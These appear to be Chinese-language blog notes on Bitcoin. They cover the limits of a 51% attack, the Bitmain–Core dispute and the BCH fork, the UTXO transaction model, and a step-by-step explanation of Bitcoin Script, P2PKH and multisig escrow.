<p>因为之前的假设一直是大部分的节点是诚实的，也就是至少51%的节点是诚实的。那万一攻击者控制了51%的节点呢？或者说，有一个超级强大的矿池，控制了51%的算力呢？</p>
<p>我们来思考一下，此时攻击者可能发起什么攻击。</p>
<p>攻击者可能偷别人的比特币吗？不能。除非能破解密码基础，否则不可能偷到别人的币。如果攻击者想在区块中包括这个签名不正确的币，那么即使有51%的算力控制，也不可能推翻共识机制。即使攻击者创造出了最长的链，但是剩下的其他诚实节点会拒绝接受这条链，而会自己创造另一条链，也就是出现了分叉。当攻击者想把偷来的币花出去时，接收方也会因为不选择攻击者创造的链而拒绝这个交易。</p>
<p>攻击者能不能进行DoS攻击？如果攻击者特别不喜欢Bob，那么确实有可能Bob的交易不会出现在所有的区块中。但是，Bob的交易可以被广播到网络中，所以，即使Bob确实是拒绝服务了，但是至少对于诚实节点而言，能够发现攻击发生了。</p>
<p>最后，能否进行双重支付等其他可以破坏区块链信任的攻击呢？在51%的算力控制下，确实有可能。但是那个时候，一旦人们发觉到比特币网络被人控制，而不再可信，那么人们会主动放弃比特币，那么比特币的价值会直接崩溃。而攻击者呢，考虑到控制51%算力的代价，出现这种情况就相当于所有的投资都会打水漂。</p>
<hr>
<p>来看一下魔幻现实。</p>
<p><strong>比特大陆</strong>，混过币圈或者挖过矿的都知道，<strong>他们是世界上最大的矿机生产商，拥有世界上最大的矿池以及矿场</strong>。是比特币世界的巨无霸。比特大陆的算力到底有多大呢？通过下面的全球算力图来简单分析一下。【下图是2017年11月的时候】</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233001.jpg" alt="img"></p>
<p><a href="https://link.zhihu.com/?target=http://BTC.com">http://BTC.com</a>和AntPool是比特大陆的矿池，这点已毋庸置疑，两者相加已经占全球算力的32.37%。而ViaBTC有比特大陆的投资，BTC.TOP则是江卓尔的，他们与比特大陆基本同仇敌忾。**这4个矿池在图上明眼一看就知道超过了51%。它们相加算力占比达到了62.28%**，还不算其它联盟的算力以及云算力等。</p>
<p><strong>Core团队</strong>这边呢？他们说起来比较像一群极客，<strong>多年来维护维护着比特币这个开源项目，同样也维护者中本聪当年去中心化的思想</strong>。所以Core在商业和挖矿方面并没有太大建树，但是<strong>在国外的社区里一直拥有极高的声誉</strong>。</p>
<p>以比特大陆为代表的大矿工群体，垄断了绝大多数算力。而开发团队Bitcoin Core，则控制了比特币代码的更新权。双方围绕着比特币是否需要扩容的话题，展开了一轮又一轮口水战。</p>
<p>由于比特大陆的力量越来越大，渐渐就影响到了比特币未来的发展路线。两个BOSS一个是在极客世界维护着比特币代码和去中心化思想，而另一个则是带有非常浓厚的商业行为的公司。两者难免在一些事情上声音不同。</p>
<p>BCH（比特现金），这是长达三年扩容争议的产物，是以矿霸比特大陆为核心主导的一次分叉，导致比特币社区在2017年下半年分裂。在比特币网络拥堵的背景下，比特现金主张走大区块路线，号称有更高性能，更高的容量，更低的交易手续费用，正式和比特币展开竞争。</p>
<p>竞争初期，因为有以比特大陆为代表的大矿工群体支持，比特现金似乎看起来有越位比特币之势，其兑换比特币的比例一度达到0.4（1个比特币现金可以兑换到0.4比特币）。</p>
<p>BCH诞生时，币市仍处牛市。分叉带来的恐慌，很快便被牛市的狂热所淹没。而BSV分家时，币圈正值熊市——一个月时间，BCH币价由分叉前的552美元，一路狂泻至74美元，跌去83%。即便计入分叉后产生的BSV，投资者依然损失惨重。</p>
<h4 id="分叉币"><a href="#分叉币" class="headerlink" title="分叉币"></a>分叉币</h4><p>莱特币、狗狗币这些竞争币种，都是独立建立数据，和比特币分离。而BCH、BTG、BCD和比特币共用某个时间节点之前的数据，两者的本质差别在这，共用数据导致，某个时间节点之前持币的用户，自动同时持有两种币。因为用户关注的是持币问题，所以前者不被称为分叉币，而后者被称为分叉币。除了比特币，以太坊ETH目前也有一种分叉币存在，即ETC。</p>
<p>分叉币从软件技术上，“复制并修改”，修改一行代码也是修改，修改100行代码也是修改，本质上是一个意思。从技术上看，不存在正宗不正宗的问题。</p>
<p>同样是硬分叉，另外一种情况，B版本得到广泛支持，而A版本被大面积停用，那么B版本就会继承这个币种正宗的称号，而A版本反而会被改名换姓叫另外一个名字，这都是约定成俗的，没有一个中心化的规定。比如以太坊ETH硬分叉后，作为新版本的B版本还是被大家称为ETH，而A版本被大家改称为ETC。</p>
<p>在A版本仍然得到绝大部分支持的情况下，上面的B1、B2、B3版本为什么能活？也是基于相同的这两点前提，第一点，这些一小撮人搞的B版本，统统修改了难度系数和算法，所以不会十万分钟才出块数据；第二点，这一小撮人技术虽然都是抄的，但是他们专注做了一系列的市场推广，上线交易所等等。</p>
<p>现在分叉就变成了四种情况（结果）：</p>
<p>1、A版本仍然被广泛支持，B版本算力不足消亡，只保留A版本。</p>
<p>2、B版本被广泛支持，A版本算力不足消亡，只保留B版本。</p>
<p>3、A版本和B版本都有相当一部分支持，同时并存。这种情况是最符合严格意义上的硬分叉。这两者是货真价实的分叉币。有一定的门槛（支持率）。到目前为止比特币没有一种这种分叉币产生。</p>
<p>4、A版本仍然被广泛支持，B版本通过代码修改难度系数和算法，一小撮人也能够让它存活下来。这种B版本的分叉币是几乎没有门槛的，到目前为止，这种分叉币几个月内就出来三五种，而且好像还在不断增加（有利可图）。大部分理解比特币的人，把这一类分叉跟其他一千多种竞争币进行等同看待，在国外的一些交易所把BCH称为bcash币而不是bitcoin cash。</p>
<p>根据虎嗅网的报道，</p>
<p><a href="https://www.huxiu.com/article/311309.html">比特币分叉往事</a></p>
<blockquote>
<p>2018年1月13日，比特币市值占整个加密币市场的份额跌至32.45%，创下历史新低。当时很多人都以为<strong>比特币被取代是早晚的事</strong>。<br>对于吴忌寒来说，算力是最大的优势和武器，他希望他主导的分叉币BCH能够取代BTC。<br>但BTC占据了比特币的正统及冠名权，还有9年用户累积与行业生态。<strong>BCH诞生之后，一直面临着一个严峻的挑战，就是没有人认可。</strong><br>再加上Bitcoin Core阵营的反对和大部分行业公司保持观望中立，在BTC分叉后，大部分BCH被用户当成糖果抛售，BCH价格刚出来只有200多美元。<br>分叉后，<strong>吴忌寒一方面通过拉高BCH价格吸引矿工过来挖BCH，另一方面不断抛售BTC，造成BTC价格不稳定</strong>，最终：“很多矿工就会选择继续挖BCH，从而导致比特币算力减少，网络更加拥堵，更多人信心丧失抛售比特币，最后矿工更加转移到BCH，形成恶性循环，导致比特币的崩盘”。<br>于是吴忌寒第一次进攻选择了拉盘。<strong>BCH的价格一路走高，分叉后不到二十天，8月20号价格就猛涨到898美元，翻了三倍多</strong>。矿工们看到BCH有利可图，再加上BTC的算力缩小，交易更拥堵；越来越多的人开始转投BCH，而这进一步导致BCH价格升格，就这样不断循环，BCH价格一路走高。<br>接着吴忌寒第二次进攻开始抢夺比特币的算力。极端情况下，BCH分流了BTC的接近一半的算力，让比特币链上的交易大幅拥堵。然而在11月，BCH算力达到了BTC的两倍，价格仍只有比特币的三分之一，最后BCH算力迅速崩溃再也没超过比特币。</p>
</blockquote>
<h1 id="区块链技术7-比特币的机制-1"><a href="#区块链技术7-比特币的机制-1" class="headerlink" title="区块链技术7:比特币的机制(1)"></a>区块链技术7:比特币的机制(1)</h1><p>比特币的共识机制生成了一个append-only的账本，一旦交易在账本中，再也不能更改。矿工——也即一些有较高计算力的节点，生成区块，并且验证交易是正确的（签名是正确的、币没有重复花费）等。账本和区块链网络使得比特币成为一种货币。在本文中，将介绍一些细节。</p>
<h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><p>区块链实际上就是一个账本，账本就是要记账，账实际就是一笔笔的交易。那首先看一下，使用下面的记账形式效果如何。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233002.jpg" alt="img"></p>
<p>第一个交易是形成区块的奖励25个比特币。Alice将17个币转给Bob，Bob转8个给Carol，Carol转5个给Alice，然后Alice转15个给David。这种记账方式非常符合我们的直觉，因为现实生活中，支付宝、微信、银联都是这么做的。但是这种做法的优缺点是什么？</p>
<p>上面的例子中，前面的几笔交易我们可能都看的很顺，因为根据之前交易的情况，我们很容易判断出交易能够顺利进行。但是看到最后一笔交易的时候就得想一下，Alice有这么多钱支付给David吗？</p>
<p>这种形式的账本也叫作account-based账本，这种记账方式的问题是：必须对每个账户的余额进行查询，才能确定一笔交易是否有效。譬如在最后一个交易的时候，得去查一下Alice的账户，总共还有多少币剩余。像上面的例子中，如果没有全局的数据结构维护用户的余额，那么可能得一路追踪回去到起始交易，看看Alice到底剩多少钱。如果想要快一点，那就得额外地维护数据结构，譬如有一个全局的数据结构，在每次交易后更新账户余额。</p>
<p>由于这样的问题，比特币并没有使用这样account-based的记账方法。比特币的记账方式是类似于这样的：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233003.jpg" alt="img"></p>
<p>每一笔交易指明了输入和输出，每一笔交易有唯一的标识符，每一笔交易可以有多个输入和多个输出。上面的例子做了简化，使得可以方便地使用序号来指代交易。</p>
<p>第一个交易中没有输入，因为它是区块的第一个交易，创造了新的币，Alice作为矿工获得了币，这25个币也是交易1的唯一一个输出，在之后使用1[0]来指代Alice拥有的25个币。在第二个交易中，输入是1[0]，25个币，然后产生了两个输出，2[0]是支付给Bob的17个币，2[1]是剩下的8个币，也形成了一个输出，接收方是Alice自己。在第三个交易中输入是2[0]，也即Bob的17个币，输出是3[0]，付给Carol的8个币，以及3[1]，付给Bob的9个币。在第四个交易中，输入是2[1]，也即Alice的8个币，分别支付给David和Alice。</p>
<p>使用这样的记账方式的好处是可以方便地验证交易的正确性。在验证一个交易时，我们首先找到输入所指向的交易的输出，同时为了确保它并没有被花掉，所以我们需要扫描所指向的交易区块和最新区块之间所有的区块，而不需要找到创世区块。</p>
<p>因为一个交易可以包括多个输入和多个输出，所以可以方便地实现各种目的。譬如，Bob接收到Alice的8个币，收到Carol的2个币，那么Bob可以将创建一个新的交易，将两个交易中的输出作为输入，从而将零钱合并为整钱。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233004.jpg" alt="img"></p>
<p>如果Bob和Carol要同时支付给David，那么在同一个交易中的输入可以包含Bob和Carol的币。在这种情况下， 交易生效的条件同时需要Bob和Carol两人的签名。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233005.jpg" alt="img"></p>
<h2 id="交易的语法"><a href="#交易的语法" class="headerlink" title="交易的语法"></a>交易的语法</h2><p>上面从概念上简单介绍了交易。接下来看一些细节——下面的图虽然一眼看上去有点复杂，但是已经是经过翻译之后的友好版本，毕竟所有在网络上传输的数据都是01串。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233006.jpg" alt="img"></p>
<p>hash是上一笔</p>
<p>如上图所示，交易由三部分构成：元数据、输入（多个）和输出（多个）。</p>
<p>元数据：顾名思义，元数据记录交易的基本信息，如交易的大小，交易的输入个数Vin<em>sz，</em>交易的输出个数Voutsz，以及整个交易的哈希值作为交易的唯一的ID。如果看的仔细，还能发现有一个lock_time，锁定时间，在后面会有具体的例子来介绍它的用法。</p>
<p>输入：交易的输入构成一个数组，多个输入中每一个结构都一样。因为它指定了之前的一个交易的输出，所以需要包含之前的交易的哈希值（<strong>哈希指针</strong>），同时指出该输入是之前交易的第几个输出。除此之外，每个输入还必须包括一个签名（scriptSig），这个签名就是一个凭证，证明交易的创建者确实有使用这个输出的权利。</p>
<p>输出：输出同样构成一个数组。每个输出有两个部分，value值和scriptPubkey。所有输出的value的和不能大于所有输入值的和。如果所有输出的和小于所有输入和，那么差值部分就成为矿工的交易费用。</p>
<p>现在可能有个疑问，本来是签名和公钥地址的位置出现的是scriptSig和scriptPubKey，而不是简单的Signature和PubKey。而且在scriptPubkey的地方，有一些奇怪的符号如OP_DUP，OP_Hash等。这就是接下来要介绍的比特币脚本，Bitcoin script。</p>
<p>这里要强调一下，scriptPubkey相当于是一把锁（lock），交易Tx1的创建者（如Alice）指定了只有Bob才能拿走交易Tx1的输出，那么scriptPubkey一定要能够保证确实是Bob才能使用；而Bob在创建交易Tx2的时候也必须提供锁的钥匙，就是scriptSig，证明自己。当然，scriptPubkey的锁可能是各种各样的，可以是特定身份的人；也可以是一个问题的答案，不论是谁，只要回答出来，就可以拿走output。可以看下面的例子。</p>
<h2 id="比特币脚本"><a href="#比特币脚本" class="headerlink" title="比特币脚本"></a>比特币脚本</h2><p>如上小节所见，在交易中出现了一些如OP_DUP的符号，这实际上是一种脚本。本小节将介绍比特币脚本语言，以及为何需要使用比特币脚本。</p>
<p>比特币脚本是基于栈的语言。栈允许两类操作：入栈和出栈。入栈是在栈顶部增加一个项目，出栈则是从栈顶部移除一个项目。脚本语言通过从左至右地处理每个项目的方式执行脚本。数字指令直接入栈，操作指令向堆栈推送（或移除）一个或多个参数，对它们进行处理，或者可以将结果入栈。例如，OP_ADD将从堆栈移除两个项目，将二者相加，然后再将二者相加之和推送到堆栈。</p>
<p>脚本的一个重要作用就是判断是否满足条件，譬如OP_EQUAL判断栈中的两个值是否相等，如果相等则将栈上的两个值出栈，入栈TRUE。如果最后栈的结果为TRUE，则条件满足。举一个非常简单的例子，譬如有钱任性Alice将自己的10个币写在一个交易中，然后加的锁是</p>
<p>3 OP_ADD 5 OP_EQUAL</p>
<p>之后如果有人能够给出满足这个条件的结果，也即最后的OP_EQUAL返回的结果是TRUE，那么则可以使用这10个币。在上面的这个锁中，就没有指定特定的人才能使用这个output，任何人能够提供问题的答案就行。</p>
<p>那么大家看一下，以上问题的结果应该是什么？</p>
<p>这个问题的答案是2。</p>
<p>任何一个人X在自己新创建的交易中的scriptSig中给出2这个答案，就可以使用Alice交易中的输出，也即拿走这10个币。看一下矿工打包的时候的计算过程。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233007.jpg" alt="img"></p>
<p>再举两个例子。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">7   OP_ADD   3   OP_SUB   1   OP_ADD    7    OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>对于上面的scriptPubkey，scriptSig应该是什么？</p>
<p>下面的例子呢？</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">OP_HASH256 6fe28c0ab6f1b372c1a6a246ae63f74f931e8365e15a089c68d6190000000000 OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>最常见的一种比特币交易应该就是通过签名获取之前交易的比特币输出。也即输出中应该指明“这一笔输出应该由这个公钥址所对应的私钥的拥有者使用。”但是回想一下，比特币中，交易地址实际上是公钥的哈希，而不是真正的公钥。因此，矿工并不知道公钥，从而也无法来验证签名。为了进行验证，每一个输出实际上指明的是“这一笔输出可以由哈希为x的公钥，以及公钥对应的私钥的所有者使用。”</p>
<p>为了表达这个含义，来看一下交易中的输出：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233008.jpg" alt="img">Pay-to-PubkeyHash脚本的例子</p>
<p>顾名思义，OP_DUP是duplicate复制，OPHASH160是进行哈希，69e0….串是指定的地址，OP_EQUALVERIFY是验证是否相等，以及OP_CHECKSIG是进行签名验证。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233009.jpg" alt="img"></p>
<p>那现在的问题是，第一个OP_DUP是用来复制什么呢？</p>
<p>答案就是，每一个交易的输入部分的scriptSig也是脚本。为了成功地使用之前交易的输出，我们需要将新交易的输入与之前交易的输出进行合并，然后执行合并之后的脚本，如果验证成功，则该交易是合法的；否则，这个交易就是无效的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233010.jpg" alt="img">新交易的输入签名+之前所引用交易的输出</p>
<p>比特币脚本简称就是Script，它是一种简单的基于栈的编程语言。基于栈意味着每个指令以线性的方式仅仅执行一遍。特别地，比特币脚本中没有循环。因此，脚本的指令的数量就暗示了执行脚本的时间和所用的内存的上限。该语言不是图灵完备的，也即不能执行任意复杂的操作。这也是合理的，因为矿工需要验证交易，也即矿工需要执行这些脚本，如果脚本中出现了死循环，矿工就被坑了。</p>
<p>交易的执行结果要么就是成功的，也即交易是合法的，可以被包括在区块链中；要么就是失败，也即交易是无效的，不能被包括在区块链中。</p>
<p>比特币脚本语言非常小，总共只有256个指令，因为每个指令使用一个字节来表示。其中，有15个指令现在已经禁用；75个预留的，有可能将来添加。大部分的指令是在普通的编程语言中见到的，有一些是和密码学相关的，如哈希，签名验证等。</p>
<p>下面使用一个例子来讲述如何运行脚本。</p>
<p>首先来具体看一下scriptSig的样子。下面是一个例子。</p>
<p>8c4930460221009e0339f72c793a89e664a8a932df073962a3f84eda0bd9e02084a6a9567f75aa022100bd9cbaca2e5ec195751efdfac164b76250b1e21302e51ca86dd7ebd7020cdc0601410450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6</p>
<p>它实际上是由四（五）个部分构成：</p>
<p>&lt;One-byte script OPCODE containing the length of the DER-encoded signature plus 1 (the length of the one-byte hash code type)&gt;|&lt; The actual DER-encoded signature plus the one-byte hash code type&gt;|&lt; One-byte script OPCODE containing the length of the public key&gt;|<The actual public key></p>
<p>8c：一个字节指示整个签名（scriptSig）的长度，共140字节</p>
<p>49：一个字节指示实际签名（DER-encoded）的长度（本例中72）加上一个字节的哈希类型SIGHASH_ALL（0x01），共73字节；73&#x3D;72+1</p>
<p>签名：30460221009e0339f72c793a89e664a8a932df073962a3f84eda0bd9e02084a6a9567f75aa022100bd9cbaca2e5ec195751efdfac164b76250b1e21302e51ca86dd7ebd7020cdc06（72字节），然后紧跟着01，sighash类型</p>
<p>41：一个字节指示公钥的长度，共65字节</p>
<p>公钥：0450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6（65字节）</p>
<p>也即，从新交易的scriptSig中可以获得对应着下图中的第一部分和第二部分。</p>
<p>下图实际上是从左向右逐步执行脚本中每一个指令的过程。上部是栈的变化，下部分是执行的具体指令。</p>
<p>sig和pubKey是两条数据指令，当遇到数据指令时，直接入栈；所以将新交易的输入中的scriptSig部分中的签名部分和公钥部分入栈。后面五条指令中除pubKeyHash外都是操作指令，基于栈的语言从栈顶获得输入，然后将结果入栈。所以第一条Dup复制指令直接把pubkey复制了一份；Hash160指令对pubkey进行哈希，将结果入栈；然后然后接下来是数据指令将新交易所引用的交易的输出中的公钥哈希入栈，然后是比较指令，比较栈顶的两个元素是否相等，如果相等弹出，如果不等则报错。最后是checksig，使用public key来验证签名。如果验证成功，那么栈顶的两个元素出栈，然后结果True入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233011.jpg" alt="img"></p>
<p>现在我们用一个例子再详细地过一遍这个过程。之前的交易Tx1，也即新交易中的输入的来源，我们假设是Alice支付给Bob的交易；新交易Tx2，也即Bob需要使用他在Tx1中获得的币。</p>
<p>为了验证这个交易的合法性，矿工要能够验证Bob确实可以使用Tx1中的输出。如何证明呢？首先就是因为Alice在Tx1交易中的scriptPubKey中，明确指定了一个哈希地址，这个哈希地址就是Bob的公钥的哈希。Bob为了证明自己就是这笔输出的合法主人，他必须提供身份信息，也即，在Tx2的输入部分的scriptSig中他提供了签名和完整的公钥，签名是使用私钥对交易的签名。</p>
<p>然后矿工开始执行验证过程。矿工将Tx2的scriptSig部分和Tx1的scriptPubKey部分简单的拼在一起，然后执行每一条指令。</p>
<p>首先是<sig>指令，这是数据指令，是来自于Bob的签名，也即Tx2的中scriptSig的第一部分，入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233012.jpg" alt="img"></p>
<p>接下来是<pubkey>，同样是数据指令，是来自于Bob的完整公钥，也即Tx2的中scriptSig的第二部分，入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233013.jpg" alt="img"></p>
<p>第三条指令是OP_DUP，这是来自Tx1的Alice的输出的scriptPubKey，OP_DUP添加到堆栈，因为是复制，所以把当前栈顶的数据复制一份放到栈顶，这样把BOB提供的公钥复制了一份。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233014.jpg" alt="img"></p>
<p>第四个指令是OP_HASH160，入栈，对下面的数据，也即Bob的公钥进行两次哈希（SHA-256以及RIPEMD-160），把自己替换掉。这样就获得了Bob公钥的哈希值。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233015.jpg" alt="img"></p>
<p>第五条指令是数据指令，<pubkeyhash>，同样来自于交易Tx1，Alice指定的的输出地址，入栈。这样栈顶就有两份哈希值了。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233016.jpg" alt="img"></p>
<p>下一条指令稍微复杂点，OP_EQUALVERIFY，入栈，相当于展开成EQUAL和VERIFY两个操作。EQUAL的操作是检查它下面的两个值是否相等，这里，也即检查Alice指定的地址（栈顶）和Bob提供的完整公钥生成的哈希（栈顶第二个）是否相等。EQUAL会得到0(false)或者1(true)。VERIFY检查EQUAL的返回值，如果是false，则交易非法，如果是true，则将自己和true出栈。这里，是为true的情况。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233017.jpg" alt="img"></p>
<p>最后一条指令是OP_CHECKSIG入栈，对栈中的两个元素进行检查，当前栈中的数据实际就是Bob的输入中提供的完整公钥和对应私钥的签名，如果验证通过则True入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233018.jpg" alt="img"></p>
<p>以上就是一个正确的Pay-to-PubKeyHash（P2PKH）的例子。</p>
<p>另外要注意一点细节就是如何使用公钥来验证签名。也即，这个签名是怎么产生的？签名是对什么的签名？我们知道签名实际上就是使用私钥对一段明文进行加密，那这里的明文是什么？这里的问题是，首先，这段明文是矿工能够访问的，不然无法验证；其次，<strong>这段明文必须是唯一的，不然Bob之前的签名可能被攻击者复制进行重放。</strong> 要确保这笔交易谁都不法篡改（矿工可能会篡改你的交易内容，把收钱的地址设置为自己的）。</p>
<p>这里答案就是整个交易Tx2。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233019.jpg" alt="img"></p>
<p>确切地说，就是交易Tx2的除了签名部分之外的内容（可以通过标志位对进行签名的交易内容进行简化，在这个例子中，使用pubkey Script替代Signature做填充）。上图共有三个部分，中间是Signed Data，也即被签名的数据。上部是Tx1和Bob自己的数据，下部分是Bob最终形成的Tx2。从上部分和中间部分形成了下部。（签名的另一个好处是，Tx2的明文部分也不能被攻击者随意篡改）</p>
<p>更多细节可以参考<a href="https://link.zhihu.com/?target=https://bitcoin.stackexchange.com/questions/3374/how-to-redeem-a-basic-tx">How to redeem a basic Tx?</a></p>
<p>以及<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/OP_CHECKSIG">OP_CHECKSIG - Bitcoin Wiki</a></p>
<p>最后，有两个问题可以讨论一下：</p>
<ol>
<li>在验证过程中，最后一步OP_CHECKSIG的输入实际上就是在新交易中Bob提供的scriptSig的两个部分，最后一步的验证也就是在验证Bob的私钥。那中间还有那么多步骤能不能省略呢？</li>
</ol>
<p>【一些同学会认为，Bob必须提供一个地址，使得其哈希值等于前交易中指定的值；但是如果这个地址之前使用过，任何人都可以提供这个地址。】</p>
<ol start="2">
<li>在引入比特币地址（公钥的哈希）之前，早期的比特币版本支持p2pk形式的交易，也即pay-to-public-key。这种交易的缺点是需要提前知道公钥，而且针对攻击的保护性较差【如果一个地址只用一次，那么P2PKH的话没有人提前知道公钥】。问题是：这种交易的scriptSig和scriptPubKey应该怎么写？</li>
</ol>
<hr>
<p>关于p2pk和p2pkh，课后有同学问，为啥没有人提前知道公钥会更安全？参考4提供了一个解释：</p>
<p>在比特币使用的椭圆曲线数字签名算法加密系统里面，一个公钥有512位长度，意味着它需要接近100个字符来呈现。举个例子，下面是一个公钥：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">04b52fd5a616a8f08ccad58469102f86fc7891e5aa4262ab8d43e41767c17d45b80850044a62af51783609176daf02fc46221057a8de11ee6ae8743065b27a4b5e</span><br></pre></td></tr></table></figure>

<p>它对应的十六进制形式的比特币地址如下： </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">4b463093e6fc3135a4de2ff577c4b658198777a9</span><br></pre></td></tr></table></figure>

<p>人们更加熟悉的base58编码形式的是： </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1obodiqhAZ3GD9onBXRZ9v7hshkuBreCu</span><br></pre></td></tr></table></figure>

<p>然而，在现实里，有一种以更紧凑的形式编码公钥的方法，只需要257个字节（译者注：这里好像有点问题，应当是257位，参见此文<a href="https://link.zhihu.com/?target=http://618.io/blog/2013/07/30/bitcoin-basic/">http://618.io/blog/2013/07/30/bitcoin-basic/</a>）： </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">03c5c9833d00bed3211a5f3733316ecf6ebc407806d70caa14862f1e2e8c2f852d</span><br></pre></td></tr></table></figure>

<p>如果我们决定把它变成base58编码的形式： </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">15sqRCowBDTfyuxPQD3ba8sN3wBB8MwGbo6gsBEGeKmUbNQADGh</span><br></pre></td></tr></table></figure>

<p>比我们如今使用的地址也没长多少。所以中本聪的选择【p2pkh是中本聪做出的选择】只是带来了不必要的复杂度和浪费吗？</p>
<p>最后证明，答案是否定的。有另外一个非常好的理由去使用这个“公钥的哈希值”的地址结构：量子加密技术。量子计算机可以破解椭圆曲线数字签名算法（也就是说，给定一个公钥，量子计算机可以相当快速的找到对应的私钥），但它们不能相类似的逆转哈希算法（或者说他们可以，但是将需要花掉280个步骤来完成一个比特币地址的破解，这仍然是相当不可行的）。因此，如果你的比特币资金存放在一个你没有支出过的地址里（这意味着公钥是没有公开的），它们在量子计算机面前也就是安全的。有理论上的途径可以让比特币完全免于量子计算机的威胁，但一个地址只是一个公钥的哈希值的事实，意味着一旦量子计算机真的出现了，在我们全面切换之前攻击者可以造成的损失要小得多。</p>
<p>【至于为啥量子计算可以破解ECC但是不能不能逆转哈希，需要进一步的分析了】</p>
<p>参考：</p>
<ol>
<li><p><a href="https://link.zhihu.com/?target=http://8btc.com/article-4382-1.html">深入理解比特币交易的脚本 - 新手入门</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://bitcoin.org/en/developer-guide%23transactions">https://bitcoin.org/en/developer-guide#transactions</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Transaction">Transaction - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://m.8btc.com/article/5340">https://m.8btc.com/article/5340</a></p>
</li>
</ol>
<h1 id="区块链技术8-比特币的机制-2"><a href="#区块链技术8-比特币的机制-2" class="headerlink" title="区块链技术8:比特币的机制(2)"></a>区块链技术8:比特币的机制(2)</h1><h2 id="OP-CHECKMULSIG"><a href="#OP-CHECKMULSIG" class="headerlink" title="OP_CHECKMULSIG"></a>OP_CHECKMULSIG</h2><p>和OP_CHECKSIG相比，OP_CHECKMULSIG多了个MUL，也即它需要检查多个签名。这个指令并不是比特币设计之初就有的，而是在2011年的BIP（bitcoin  improvement protocol）中提出的（详见参考1）。</p>
<p>提出该指令的目的是使能安全钱包、托管交易、以及其他需要多于一个签名的使用情况。举例来说，可以使用的例子包括：</p>
<ul>
<li>使用WPS（wallet protection service）保护的钱包。譬如需要2-of-2的签名的交易，其中一个签名来自于安装了钱包的（可能不安全的）电脑，另一个签名来自WPS。当发送受保护的比特币时，用户的比特币客户端会将交易发给WPS，WPS会向用户请求确认，譬如用户确实发起了这个交易，以及交易的细节是正确的。 Two-factor authentication wallet - One private key is on your primary computer, the other on your smartphone — the funds cannot be spent without a signature from both devices. Thus, an attacker must gain access to both devices in order to steal your funds (much more difficult than one device)。Side note: customers should insist that their wallet protection service provide them with copies of the private key(s) used to secure their wallets that they can safely store off-line, so that their coins can be spent even if the WPS goes out of business。</li>
<li>组织资金使用：2-of-3的情况，由三名董事组成的董事会，为他们的组织维护资金-除非其中两名董事同意，否则不得动用这些资金。 较大的组织可以进行更大的多重签名交易，例如3-of-5, 5-of-9等。</li>
<li>第三方托管服务（买方、卖方、以及信任第三方 Escrow transaction）。适用于需要2-of-3签名的交易。买方、卖方和第三方没人都提供公钥，买方将创建交易，并使用2-of-3 CHECKMULTISIG，然后将交易ID发送给卖方和第三方。卖方履行自己的责任，然后要求买方共同签名，才能获得支付的币。如果买卖双方起了争执，则第三方会参与进来，譬如如果买方收到货却不肯签名，那么第三方将进行签名，这样满足条件，从而卖方可以获得应得的报酬。</li>
</ul>
<p>关于第三方托管的例子，详细来说，譬如Alice想要使用比特币向Bob购买一些物品。问题是，Alice希望在收到物品之后才付钱，而Bob希望收到钱之后才发货。这时候就需要第三方托管（支付宝）。而第三方托管可以通过MultiSig方便地实现。</p>
<p>Alice和Bob同意找到信任的第三方Carol。然后Alice创建了交易。但是这个交易不是直接发给Bob的，而是一个MULTISIG的交易，需要2-of-3的签名。也即，Alice将自己的币发给了一个地址，要求Alice、Bob以及Carol三人中任意两人的签名才能使用这个输出。</p>
